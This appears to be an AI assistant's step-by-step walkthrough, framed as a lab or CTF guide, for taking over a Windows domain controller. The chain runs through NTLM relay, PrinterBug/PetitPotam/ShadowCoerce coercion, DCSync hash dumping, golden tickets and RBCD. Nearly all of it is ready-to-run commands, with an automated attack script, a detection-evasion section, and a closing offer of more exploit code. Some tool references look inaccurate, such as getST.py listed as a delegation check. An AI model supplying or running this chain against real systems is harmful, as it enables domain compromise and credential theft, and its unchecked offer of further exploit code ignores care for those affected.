DC Coerce Attack via NTLM Relay - Kali Linux Edition

Lab Environment Setup

1. Install Required Tools

```bash
# Update and install essential packages
sudo apt update && sudo apt upgrade -y

# Install Impacket for NTLM relay
sudo apt install python3-impacket -y
# OR clone from GitHub for latest version
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

# Install responder for LLMNR/NBT-NS poisoning
sudo apt install responder -y

# Install BloodHound for AD enumeration
sudo apt install bloodhound -y

# Install crackmapexec for AD exploitation
sudo apt install crackmapexec -y

# Install LdapDomainDump
pip3 install ldapdomaindump

# Install Kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Install Coercer for various coercion methods
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
```

2. Network Configuration

```bash
# Check your IP address
ip addr show

# Add domain to /etc/hosts (if not using DNS)
echo "192.168.x.x dc01.xyz.com xyz.com" | sudo tee -a /etc/hosts
```

Reconnaissance Phase

1. Basic Domain Enumeration

```bash
# Use crackmapexec to check domain connectivity
crackmapexec smb xyz.com -u 'harsh.pa' -p '#12345' --users

# Get domain info via LDAP
ldapdomaindump -u 'xyz.com\harsh.pa' -p '#12345' ldap://dc01.xyz.com

# Enumerate users with Kerbrute
kerbrute userenum -d xyz.com --dc dc01.xyz.com /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt

# SMB shares enumeration
smbclient -L //dc01.xyz.com -U 'xyz.com\harsh.pa%#12345'
```

2. Advanced Enumeration

```bash
# Check for unconstrained delegation
python3 impacket/examples/getST.py xyz.com/harsh.pa:#12345 -spn cifs/dc01.xyz.com -impersonate administrator

# List SPNs
python3 impacket/examples/GetUserSPNs.py xyz.com/harsh.pa:#12345 -dc-ip dc01.xyz.com -request

# Check for LAPS
python3 impacket/examples/laps.py xyz.com/harsh.pa:#12345 -dc-ip dc01.xyz.com
```

Attack Phase - Full Chain

Option A: PrinterBug + NTLM Relay (Recommended)

Step 1: Start NTLM Relay Server

```bash
# Method 1: Relay to LDAP for DCSync
python3 impacket/examples/ntlmrelayx.py -t ldap://dc01.xyz.com --no-http-server --no-wcf-server --no-raw-server -smb2support --escalate-user harsh.pa

# Method 2: Relay to SMB (for hash dumping)
python3 impacket/examples/ntlmrelayx.py -t smb://dc01.xyz.com -smb2support --no-smb-server --no-http-server

# Method 3: Relay to multiple protocols
python3 impacket/examples/ntlmrelayx.py -t ldaps://dc01.xyz.com -t smb://dc01.xyz.com --no-smb-server -smb2support --shadow-credentials --shadow-target 'DC01$'
```

Step 2: Trigger PrinterBug from Kali

```bash
# Using dementor.py (PrinterBug implementation)
git clone https://github.com/NotMedic/NetNTLMtoSilverTicket.git
cd NetNTLMtoSilverTicket
python3 dementor.py -d xyz.com -u harsh.pa -p '#12345' -ah YOUR_KALI_IP dc01.xyz.com

# Using Coercer tool
python3 Coercer/coercer.py -d xyz.com -u harsh.pa -p '#12345' -t dc01.xyz.com -l YOUR_KALI_IP --always-continue

# Using rpcdump.py to check available RPC interfaces
python3 impacket/examples/rpcdump.py xyz.com/harsh.pa:'#12345'@dc01.xyz.com
```

Step 3: Capture and Exploit

Once relay captures authentication:

· If relayed to LDAP: You can perform DCSync
· If relayed to SMB: You can dump SAM/LSA secrets

Option B: PetitPotam + NTLM Relay

Step 1: Start NTLM Relay

```bash
# Relay to LDAPS for RBCD attack
python3 impacket/examples/ntlmrelayx.py -t ldaps://dc01.xyz.com --delegate-access --no-smb-server --no-http-server -smb2support
```

Step 2: Trigger PetitPotam

```bash
# Using petitpotam.py
python3 impacket/examples/petitpotam.py xyz.com/harsh.pa:'#12345'@dc01.xyz.com YOUR_KALI_IP

# Using Coercer with specific method
python3 Coercer/coercer.py -d xyz.com -u harsh.pa -p '#12345' -t dc01.xyz.com -l YOUR_KALI_IP -m PetitPotam
```

Option C: ShadowCoerce (CVE-2022-26935)

```bash
# Using Coercer tool
python3 Coercer/coercer.py -d xyz.com -u harsh.pa -p '#12345' -t dc01.xyz.com -l YOUR_KALI_IP -m ShadowCoerce
```

Post-Exploitation

1. If You Get DCSync Privileges

```bash
# Dump all domain hashes
python3 impacket/examples/secretsdump.py xyz.com/harsh.pa@dc01.xyz.com -hashes :NTLM_HASH -just-dc

# Dump specific user
python3 impacket/examples/secretsdump.py xyz.com/administrator@dc01.xyz.com -hashes :NTLM_HASH

# Create golden ticket
python3 impacket/examples/ticketer.py -nthash NTLM_HASH -domain-sid S-1-5-21-... -domain xyz.com administrator

# Use golden ticket
export KRB5CCNAME=administrator.ccache
python3 impacket/examples/smbclient.py xyz.com/administrator@dc01.xyz.com -k -no-pass
```

2. If You Get Machine Account Hash

```bash
# Perform RBCD (Resource Based Constrained Delegation)
# First create a computer account
python3 impacket/examples/addcomputer.py xyz.com/harsh.pa:'#12345' -computer-name 'FAKECOMP$' -computer-pass 'Passw0rd!'

# Then set RBCD on target
python3 impacket/examples/rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'DC01$' -action write xyz.com/harsh.pa:'#12345'

# Get service ticket
python3 impacket/examples/getST.py xyz.com/'FAKECOMP$':'Passw0rd!' -spn cifs/dc01.xyz.com -impersonate administrator

# Access with ticket
export KRB5CCNAME=administrator.ccache
python3 impacket/examples/smbclient.py xyz.com/administrator@dc01.xyz.com -k -no-pass
```

Automated Attack Chain Script

Create attack.sh:

```bash
#!/bin/bash

# Configuration
DOMAIN="xyz.com"
USER="harsh.pa"
PASS="#12345"
DC="dc01.xyz.com"
KALI_IP=$(hostname -I | awk '{print $1}')

echo "[+] Starting attack on $DOMAIN"

# Step 1: Start NTLM Relay
echo "[+] Starting NTLM Relay server..."
xterm -e "python3 impacket/examples/ntlmrelayx.py -t ldaps://$DC --no-http-server --escalate-user $USER" &

# Wait for relay to start
sleep 5

# Step 2: Trigger coercion
echo "[+] Triggering PrinterBug..."
python3 dementor.py -d $DOMAIN -u $USER -p "$PASS" -ah $KALI_IP $DC

# Step 3: Check for success
echo "[+] Checking for DCSync privileges..."
sleep 10
python3 impacket/examples/secretsdump.py $DOMAIN/$USER@$DC -just-dc-user administrator
```

Troubleshooting Common Issues

1. SMB Signing Issues

```bash
# Check if SMB signing is required
nmap --script smb2-security-mode -p 445 dc01.xyz.com

# If signing is required, target LDAP/LDAPS instead
python3 impacket/examples/ntlmrelayx.py -t ldaps://dc01.xyz.com -smb2support
```

2. Firewall Issues

```bash
# Check connectivity
nc -zv dc01.xyz.com 445
nc -zv dc01.xyz.com 389
nc -zv dc01.xyz.com 636

# Use different ports if blocked
python3 impacket/examples/ntlmrelayx.py -t ldap://dc01.xyz.com:389
```

3. Authentication Issues

```bash
# Test credentials first
python3 impacket/examples/smbclient.py xyz.com/harsh.pa:'#12345'@dc01.xyz.com -no-pass

# Check account status
python3 impacket/examples/netrpc.py -hashes :NTLM_HASH xyz.com/harsh.pa@dc01.xyz.com samr
```

Detection Evasion

```bash
# Use proxychains for tunneling
sudo apt install proxychains4
# Configure /etc/proxychains4.conf

# Use different source port
python3 impacket/examples/ntlmrelayx.py -t ldap://dc01.xyz.com --source-port 50000

# Add delay between attempts
python3 Coercer/coercer.py --delay 5 -d xyz.com -u harsh.pa -p '#12345' -t dc01.xyz.com -l $KALI_IP
```

Cleanup Script

```bash
#!/bin/bash
# cleanup.sh - Remove created artifacts

DOMAIN="xyz.com"
USER="harsh.pa"
PASS="#12345"
DC="dc01.xyz.com"

echo "[+] Cleaning up..."

# Remove created computer account
python3 impacket/examples/addcomputer.py $DOMAIN/$USER:'$PASS' -computer-name 'FAKECOMP$' -delete

# Reset RBCD if modified
python3 impacket/examples/rbcd.py -delegate-to 'DC01$' -action remove $DOMAIN/$USER:'$PASS'

echo "[+] Cleanup complete"
```

CTF-Specific Tips

1. Check for non-default configurations:

```bash
# Check for WebDAV
nmap -p 80,443 --script http-webdav-scan dc01.xyz.com

# Check for WinRM
evil-winrm -i dc01.xyz.com -u harsh.pa -p '#12345'

# Check for RDP
xfreerdp /v:dc01.xyz.com /u:harsh.pa /p:'#12345'
```

1. Look for alternative coercion methods:

```bash
# List all coercion methods available
python3 Coercer/coercer.py --list

# Try all methods
python3 Coercer/coercer.py -d xyz.com -u harsh.pa -p '#12345' -t dc01.xyz.com -l $KALI_IP --all
```

1. Use BloodHound for path discovery:

```bash
# Collect data
bloodhound-python -d xyz.com -u harsh.pa -p '#12345' -ns dc01.xyz.com -c All

# Analyze in BloodHound GUI
sudo neo4j console &
bloodhound
```

Would you like me to provide specific exploit code for any of the coercion methods or help troubleshoot a particular issue in your lab setup?
